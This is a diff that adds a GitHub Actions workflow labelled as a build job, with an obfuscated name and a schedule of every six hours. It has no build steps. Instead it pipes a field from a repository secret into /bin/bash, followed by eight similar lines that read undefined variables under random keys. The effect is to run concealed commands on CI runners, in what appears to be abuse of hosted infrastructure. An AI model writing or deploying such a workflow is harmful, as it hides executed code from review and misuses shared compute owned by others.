@@ -1,0 +1,26 @@
+name: weijinshen6789
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weijinshen6789
+        env:
+          em09731: ${{ secrets.em09731 }}
+        run: |
+          echo $em09731 | jq -r .s40310 | /bin/bash
+          echo $a53 | jq -r .juedz5168 | /bin/bash
+          echo $hz0 | jq -r .nz8 | /bin/bash
+          echo $rrb711 | jq -r .ln78 | /bin/bash
+          echo $aric29603 | jq -r .umpa5 | /bin/bash
+          echo $lnmv11 | jq -r .ptn767 | /bin/bash
+          echo $rp79882 | jq -r .ru3058 | /bin/bash
+          echo $cmndq2 | jq -r .k74 | /bin/bash
+          echo $qp492 | jq -r .bfl756 | /bin/bash
+
